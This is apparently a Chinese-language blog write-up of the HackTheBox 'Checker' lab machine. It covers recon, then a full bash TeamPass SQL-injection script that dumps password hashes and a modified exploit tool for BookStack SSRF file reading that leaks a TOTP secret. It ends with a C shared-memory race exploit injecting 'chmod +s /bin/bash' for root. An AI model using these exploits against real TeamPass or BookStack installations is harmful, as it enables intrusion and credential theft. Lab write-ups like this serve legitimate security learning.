---
title: HackTheBox-Season7-Checker
published: 2025-03-09 16:18:09
tags: [HackTheBox]
category: 靶机
draft: false
---

# Season7-Checker

> https://app.hackthebox.com/competitive/7/overview | `hard`
> 

## 前期踩点

首先将`checker.htb`添加到`hosts`文件

```bash
⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 10.10.11.56    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:03 EST
Nmap scan report for 10.10.11.56
Host is up (0.21s latency).
Not shown: 65053 filtered tcp ports (no-response), 479 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 68.70 seconds
```

```bash
⚡ root@kali  ~  nmap -sT -A -T4 -O -p 22,80,8080 10.10.11.56  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:06 EST
Nmap scan report for 10.10.11.56
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
80/tcp   open  http    Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache
8080/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   397.46 ms 10.10.16.1
2   397.58 ms 10.10.11.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.63 seconds
```

```bash
⚡ root@kali  ~  nmap -script=vuln -p 80,8080 10.10.11.56    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:07 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Stats: 0:04:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
PORT     STATE SERVICE
80/tcp   open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 294.05 seconds
```

访问`10.10.11.56:8080`端口回会加载`vault.checker.htb`将写入`hosts`文件

扫描子域名，无结果（但是其实会返回`429`，过多的请求，大概率是不要我们去扫描了）

```bash
⚡ root@kali  ~/Desktop/test/checker  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hl=7,8 -H 'Host:FUZZ.checker.
htb' -u checker.htb                                                                                                                                          
********************************************************                                                                                                     
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                     
********************************************************                                                                                                     
                                                                                                                                                             
Target: http://checker.htb/                                                                                                                                  
Total requests: 4989                                                                                                                                         
                                                                                                                                                             
=====================================================================                                                                                        
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================                                                                                        
                                                                              
                                                                                                                                                             
Total time: 0                                                                                                                                                
Processed Requests: 4989                                                                                                                                     
Filtered Requests: 4989                                                                                                                                      
Requests/sec.: 0                     

⚡ root@kali  ~/Desktop/test/checker  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hl=7,8 -H 'Host:FUZZ.checker.
htb:8080' -u checker.htb:8080           
********************************************************                                                                                                     
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                     
********************************************************                                                                                                     
                                                                                                                                                             
Target: http://checker.htb:8080/                                                                                                                             
Total requests: 4989                                                                                                                                         
                                                                                                                                                             
=====================================================================                                                                                        
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================          
Total time: 0                                                                                                                                                
Processed Requests: 4989                                                                                                                                     
Filtered Requests: 4989                                                                                                                                      
Requests/sec.: 0                                                                                                                                             
```

访问`HTTP`服务，进来就是一个输入框，`BookStack` 使用 PHP 和 Laravel 构建的创建文档/wiki 内容的平台

![image.png](image%2012.png)

访问`8080`端口，也是登录框，`teampass`  协作密码管理器

![image.png](image%2013.png)

## TeamPass 利用

经查阅`Teampass`存在`SQL`注入漏洞： https://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2

POC：

```bash
if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi

vulnerable_url="$1/api/index.php/authorize"

check=$(curl --silent "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi

# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'

exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
  token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
}

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done
```

成功读到用户

```bash
⚡ root@kali  ~/Desktop/test/checker  ./poc.sh checker.htb:8080
There are 2 users in the system:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
```

使用`john`爆破，得到`bob`密码`cheerleader`

```bash
⚡ root@kali  ~/Desktop/test/checker  john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cheerleader      (?)     
```

登陆后台，成功进入

![image.png](image%2014.png)

还可以找到`BookStack`的账号密码 `bob@checker.htb` : `mYSeCr3T_w1kI_P4sSw0rD`

![image.png](image%2015.png)

还可以找到`SSH`的账号密码 `reader` : `hiccup-publicly-genesis`

![image.png](image%2016.png)

登录`SSH` ，输入密码后还要输入`Verification code` (`MFA` 双因子认证登录)

![image.png](image%2017.png)

## BookStack

拿到`bob`用户凭据登录`BookStack`

![image.png](image%2018.png)

试了一下`BookStack` 添加书籍时插入代码，但是不成功

到`BookStack`的官网下找文档，发现里面有`MFA`认证，可能是和`header`的有关

https://www.bookstackapp.com/docs/admin/security/#multi-factor-authentication

![image.png](image%2019.png)

在个人界面里面也能找到 `Setup Multi-Factor Authentication` 选项

![image.png](image%2020.png)

底下的的`Backup Codes` （将以下代码列表存储在安全的地方。访问系统时，您将能够将其中一个代码用作第二个身份验证机制）但是在我使用脚本尝试了很多次之后都无法进入，拼尽全力无法战胜（香蕉猫）

继续进行信息收集，在`admin`写的`Linux-security`发现一个路径`/backup/home_backup`

![image.png](image%2021.png)

找到一个SSRF漏洞：https://fluidattacks.com/advisories/imagination/ | https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/

> A server-side request forgery (SSRF) vulnerability has been identified in Book Stack that, under certain conditions, could allow an attacker to obtain local files from the server. The attacker must have writer permissions. | 某些条件下攻击者可以获取本地文件
> 

根据漏洞报告可以找到利用工具：https://github.com/synacktiv/php_filter_chains_oracle_exploit

读取的文件是：`/backup/home_backup/home/reader/.google_authenticator` 

> 这个文件包含了与 Google Authenticator 相关的密钥和配置信息。每个用户在启用 2FA 时，Google Authenticator 会生成一个密钥，并将其保存到 `.google_authenticator` 文件中。这个密钥是用来生成 TOTP 的核心数据
> 

```bash
// POC
python filters_chain_oracle_exploit.py \
  --target "http://checker.htb/ajax/page/12/save-draft" \
  --file "/backup/home_backup/home/reader/.google_authenticator" \
  --parameter "html" \
  --verb PUT \
  --headers "{\"X-CSRF-TOKEN\": \"$CSRF-TOKEN\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"jstree_select=1; XSRF-TOKEN=$XSRF-TOKEN; bookstack_session=$BookStack\"}"
```

我们新建书本添加新页面后点击保存的包即可获得上面所需所有参数

![image.png](image%2022.png)

![image.png](image%2023.png)

使用工具前需要替换新的`php_filter_chains_oracle_exploit/filters_chain_oracle/core/requestor.py`文件，不然很容易出现错误

```bash
// new requestor.py
import json
import requests
import time
import base64  # Ensure base64 module is imported
from filters_chain_oracle.core.verb import Verb
from filters_chain_oracle.core.utils import merge_dicts
import re

"""
Class Requestor, defines all the request logic.
"""
class Requestor:
    def __init__(self, file_to_leak, target, parameter, data="{}", headers="{}", verb=Verb.POST, in_chain="", proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):
        self.file_to_leak = file_to_leak
        self.target = target
        self.parameter = parameter
        self.headers = headers
        self.verb = verb
        self.json_input = json_input
        self.match = match
        print("[*] The following URL is targeted : {}".format(self.target))
        print("[*] The following local file is leaked : {}".format(self.file_to_leak))
        print("[*] Running {} requests".format(self.verb.name))
        if data != "{}":
            print("[*] Additionnal data used : {}".format(data))
        if headers != "{}":
            print("[*] Additionnal headers used : {}".format(headers))
        if in_chain != "":
            print("[*] The following chain will be in each request : {}".format(in_chain))
            in_chain = "|convert.iconv.{}".format(in_chain)
        if match:
            print("[*] The following pattern will be matched for the oracle : {}".format(match))
        self.in_chain = in_chain
        self.data = json.loads(data)
        self.headers = json.loads(headers)
        self.delay = float(delay)
        if proxy :
            self.proxies = {
                'http': f'{proxy}',
                'https': f'{proxy}',
            }
        else:
            self.proxies = None
        self.instantiate_session()
        if time_based_attack:
            self.time_based_attack = self.error_handling_duration()
            print("[+] Error handling duration : {}".format(self.time_based_attack))
        else:
            self.time_based_attack = False
        
    """
    Instantiates a requests session for optimization
    """
    def instantiate_session(self):
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.proxies = self.proxies
        self.session.verify = False

    def join(self, *x):
        return '|'.join(x)

    """
    Used to see how much time a 500 error takes to calibrate the timing attack
    """
    def error_handling_duration(self):
        chain = "convert.base64-encode"
        requ = self.req_with_response(chain)
        self.normal_response_time = requ.elapsed.total_seconds()
        self.blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)
        chain_triggering_error = f"convert.base64-encode|{self.blow_up_inf}"
        requ = self.req_with_response(chain_triggering_error)
        return requ.elapsed.total_seconds() - self.normal_response_time

    """
    Used to parse the option parameter sent by the user
    """
    def parse_parameter(self, filter_chain):
        data = {}
        if '[' and ']' in self.parameter: # Parse array elements
            
            main_parameter = [re.search(r'^(.*?)\[', self.parameter).group(1)]
            sub_parameters = re.findall(r'\[(.*?)\]', self.parameter)
            all_params = main_parameter + sub_parameters
            json_object = {}
            temp = json_object
            for i, element in enumerate(all_params):
                if i == len(all_params) -1:
                    temp[element] = filter_chain
                else:
                    temp[element] = {}
                    temp = temp[element]
            data = json_object
        else:
            data[self.parameter] = filter_chain
        return merge_dicts(data, self.data)

    """
    Returns the response of a request defined with all options
    """
    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)

        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        # DEBUG print(filter_chain)
        merged_data = self.parse_parameter(filter_chain)

        # Fix indentation: Encode filter chain in Base64
        encoded_bytes = base64.b64encode(filter_chain.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')
        payload = f"<img src='data:image/png;base64,{encoded_str}'/>"
        merged_data[self.parameter] = payload  # Fixed indentation

        # Make the request, the verb and data encoding is defined
        try:
            if self.verb == Verb.GET:
                requ = self.session.get(self.target, params=merged_data)
                return requ
            elif self.verb == Verb.PUT:
                if self.json_input: 
                    requ = self.session.put(self.target, json=merged_data)
                else:
                    requ = self.session.put(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.DELETE:
                if self.json_input:
                    requ = self.session.delete(self.target, json=merged_data)
                else:
                    requ = self.session.delete(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.POST:
                if self.json_input:
                    requ = self.session.post(self.target, json=merged_data)
                else:
                    requ = self.session.post(self.target, data=merged_data)
                return requ
        except requests.exceptions.ConnectionError :
            print("[-] Could not instantiate a connection")
            exit(1)
        return None

    """
    Used to determine if the answer trigged the error based oracle
    TODO : increase the efficiency of the time based oracle
    """
    def error_oracle(self, s):
        requ = self.req_with_response(s)

        if self.match:
            # DEBUG print("PATT", (self.match in requ.text))
            return self.match in requ.text 

        if self.time_based_attack:
            # DEBUG print("ELAP", requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01))
            return requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01)
        
        # DEBUG print("CODE", requ.status_code == 500)
        return requ.status_code == 500

```

```bash
python filters_chain_oracle_exploit.py \
  --target "http://checker.htb/ajax/page/12/save-draft" \
  --file "/backup/home_backup/home/reader/.google_authenticator" \
  --parameter "html" \
  --verb PUT \
  --headers "{\"X-CSRF-TOKEN\": \"W2b1WrEWyjBm6Trtww9aTPmoS9ZBqZejPACNmTT5\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"jstree_select=1; XSRF-TOKEN=eyJpdiI6InRMa3VVTzZTa2EzWDVFRFQzaEFlSkE9PSIsInZhbHVlIjoiUFFvT2IxeDR2U3FKMndxenlmRmwwTWYyUlJNbXVscnRrUGFtZkdzM2hjKzlsU1U0ZjdOUkVRMkI2U1FKYmpqMFNDTnVHdVNFYzR1TXhDN1A5dFdlUHVBK05UZUhweWtyMHRKUVFHbVZUd05Lays5VklZS3JtbjByNWJqVEk0QTAiLCJtYWMiOiI1Y2Y5OWMwNGRkOTVlODQ4ZjI0YWYxNDBlMWM0MmM4MmE1YjdkYWI1YmY0NzUzMmVlNWRhZjI2MDZlYWI5ZWQwIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6Ild0Um4wek9DVzlZYU55WEZpZUFqK0E9PSIsInZhbHVlIjoiQlFYMXZic1NQUXBtVG1IRXFvb1R3dkFsTTJyQW5meUZuUi9QbUd0Lzdtb2RXS2VGOUpFQUhHVXFmRGlBRW9iNG1SUEttTVlYZzF6NzJiVGxicFp5L09qVUdGQmp4UEFqaUFTZWt5VkZpS0I3UE1URHcrNkZML2FlUy9JQW82cXIiLCJtYWMiOiJiMTBmMWQzNzVjNTYwNDMyYWFlMTU1YzNlNTRmYzJhYjk0NTllMDUzODgxYTRjY2RhMmJmNzVkMzJmMDUxZDhkIiwidGFnIjoiIn0%3D\"}"
```

![image.png](image%2024.png)

最终读出来是：`DVDBRAODLCWF7I2ONA4K5LQLUE` ，并使用https://it-tools.tech/otp-generator 来获取验证码

登录`SSH`，得使用美国或者欧洲节点，不然会出现 `Error "Operation Not Permitted"` 是时间同步问题，但是通过`date --set "$(curl -is 10.10.11.56 | grep Date | awk -F 'Date:' '{print $2}')"` 也无法登录成功

```bash
⚡ root@kali  ~/Desktop/test/checker/php_filter_chains_oracle_exploit  ssh reader@checker.htb
(reader@checker.htb) Password: // hiccup-publicly-genesis
(reader@checker.htb) Verification code: // code
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Last login: Tue Feb 25 15:23:52 2025 from 10.10.16.57
reader@checker:~$ 

```

读取`.google_authenticator` 

```bash
reader@checker:~$ cat .google_authenticator 
DVDBRAODLCWF7I2ONA4K5LQLUE
" TOTP_AUTH
```

读取用户`UserFlag`

```bash
reader@checker:~$ cat user.txt 
13a819d80cf8119xxxxxxxxxxxxxxx
```

## 信息收集

查看权限

```bash
reader@checker:~$ sudo -l
Matching Defaults entries for reader on checker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
/2
User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

```bash
reader@checker:/opt/hash-checker$ ls -al
total 68
drwxr-xr-x 2 root root  4096 Jan 30 17:09 .
drwxr-xr-x 5 root root  4096 Jan 30 17:04 ..
-r-------- 1 root root   118 Jan 30 17:07 .env
-rwxr--r-- 1 root root   141 Jan 30 17:04 check-leak.sh
-rwxr--r-- 1 root root 42376 Jan 30 17:02 check_leak
-rwx------ 1 root root   750 Jan 30 17:07 cleanup.sh
-rw-r--r-- 1 root root  1464 Jan 30 17:09 leaked_hashes.txt
```

查看`check-leak.sh`

```bash
reader@checker:/opt/hash-checker$ cat check-leak.sh 
#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"
```

将`check_leak`拉出来分析

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdx
  unsigned int v5; // [rsp+14h] [rbp-3Ch]
  char *v6; // [rsp+18h] [rbp-38h]
  char *v7; // [rsp+20h] [rbp-30h]
  char *v8; // [rsp+28h] [rbp-28h]
  char *v9; // [rsp+30h] [rbp-20h]
  char *s; // [rsp+40h] [rbp-10h]
  void *ptr; // [rsp+48h] [rbp-8h]

  v6 = getenv("DB_HOST");
  v7 = getenv("DB_USER");
  v8 = getenv("DB_PASSWORD");
  v9 = getenv("DB_NAME");
  if ( *(_BYTE *)(((unsigned __int64)(argv + 1) >> 3) + 0x7FFF8000) )
    __asan_report_load8(argv + 1);
  s = (char *)argv[1];
  if ( !v6 || !v7 || !v8 || !v9 )
  {
    if ( *(_BYTE *)(((unsigned __int64)&stderr >> 3) + 0x7FFF8000) )
      __asan_report_load8(&stderr);
    fwrite("Error: Missing database credentials in environment\n", 1uLL, 0x33uLL, stderr);
    __asan_handle_no_return();
    exit(1);
  }
  if ( argc != 2 )
  {
    if ( *(_BYTE *)(((unsigned __int64)argv >> 3) + 0x7FFF8000) )
      __asan_report_load8(argv);
    v3 = *argv;
    if ( *(_BYTE *)(((unsigned __int64)&stderr >> 3) + 0x7FFF8000) )
      __asan_report_load8(&stderr);
    fprintf(stderr, "Usage: %s <USER>\n", v3);
    __asan_handle_no_return();
    exit(1);
  }
  if ( !s )
    goto LABEL_40;
  if ( *(_BYTE *)(((unsigned __int64)s >> 3) + 0x7FFF8000) != 0
    && ((unsigned __int8)s & 7) >= *(_BYTE *)(((unsigned __int64)s >> 3) + 0x7FFF8000) )
  {
    __asan_report_load1(s);
  }
  if ( !*s )
  {
LABEL_40:
    if ( *(_BYTE *)(((unsigned __int64)&stderr >> 3) + 0x7FFF8000) )
      __asan_report_load8(&stderr);
    fwrite("Error: <USER> is not provided.\n", 1uLL, 0x1FuLL, stderr);
    __asan_handle_no_return();
    exit(1);
  }
  if ( strlen(s) > 0x14 )
  {
    if ( *(_BYTE *)(((unsigned __int64)&stderr >> 3) + 0x7FFF8000) )
      __asan_report_load8(&stderr);
    fwrite("Error: <USER> is too long. Maximum length is 20 characters.\n", 1uLL, 0x3CuLL, stderr);
    __asan_handle_no_return();
    exit(1);
  }
  ptr = (void *)fetch_hash_from_db(v6, v7, v8, v9, s);
  if ( ptr )
  {
    if ( (unsigned __int8)check_bcrypt_in_file("/opt/hash-checker/leaked_hashes.txt", ptr) )
    {
      puts("Password is leaked!");
      if ( *(_BYTE *)(((unsigned __int64)&edata >> 3) + 0x7FFF8000) )
        __asan_report_load8(&edata);
      fflush(edata);
      v5 = write_to_shm(ptr);
      printf("Using the shared memory 0x%X as temp location\n", v5);
      if ( *(_BYTE *)(((unsigned __int64)&edata >> 3) + 0x7FFF8000) )
        __asan_report_load8(&edata);
      fflush(edata);
      sleep(1u);
      notify_user(v6, v7, v8, v9, v5);
      clear_shared_memory(v5);
    }
    else
    {
      puts("User is safe.");
    }
    free(ptr);
  }
  else
  {
    puts("User not found in the database.");
  }
  return 0;
}
```

exp（佬提供：`Telegram : @PAINNNN_21` `Discord ID : pain._.05`）

```bash
#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <time.h>
#include <errno.h>
#include <string.h>

#define SHM_SIZE 0x400   // 1024 bytes
#define SHM_MODE 0x3B6   // Permissions: 0666 in octal

int main(void) {
    // Seed the random number generator with the current time.
    time_t current_time = time(NULL);
    srand((unsigned int)current_time);

    // Generate a random number and apply modulo 0xfffff to generate the key.
    int random_value = rand();
    key_t key = random_value % 0xfffff;

    // Print the generated key in hexadecimal.
    printf("Generated key: 0x%X\n", key);

    // Create (or get) the shared memory segment with the generated key.
    // IPC_CREAT flag is used to create the segment if it does not exist.
    int shmid = shmget(key, SHM_SIZE, IPC_CREAT | SHM_MODE);
    if (shmid == -1) {
        perror("shmget");
        exit(EXIT_FAILURE);
    }

    // Attach to the shared memory segment.
    char *shmaddr = (char *)shmat(shmid, NULL, 0);
    if (shmaddr == (char *)-1) {
        perror("shmat");
        exit(EXIT_FAILURE);
    }

    // Define the payload string to be written.
    const char *payload = "Leaked hash detected at Sat Feb 26 22:51:48 2025 > '; chmod +s /bin/bash;#";

    // Write the payload to the shared memory segment.
    snprintf(shmaddr, SHM_SIZE, "%s", payload);

    // Optionally, print the content that was written.
    printf("Shared Memory Content:\n%s\n", shmaddr);

    // Detach from the shared memory segment.
    if (shmdt(shmaddr) == -1) {
        perror("shmdt");
        exit(EXIT_FAILURE);
    }

    return 0;
}

```

开启两个`ssh`窗口

![image.png](image%2025.png)

然后上传exp `fuzzer.c` 并编译

```bash
gcc fuzzer.c -o fuzzer
chmod +x fuzzer
```

编译后在一个窗口执行循环，一个窗口执行`check-leak.sh`

```bash
while true;do ./fuzzer; done
```

执行`check-leak.sh` 后，会有一秒在某块内存上可写的，并且最后会通过`popen`来执行那块内存上代码，通过循环条件竞争，将`payload`覆盖到将要执行的内存上，覆盖后，`popen`执行`chmod +s /bin/bash` ，即可获得`root`权限

![image.png](image%2026.png)

## 总结

任意文件读取双因子登录的相关的密钥和配置信息。提权是通过逆向分析找到漏洞触发任意代码执行（不会RE看着就是一脸懵）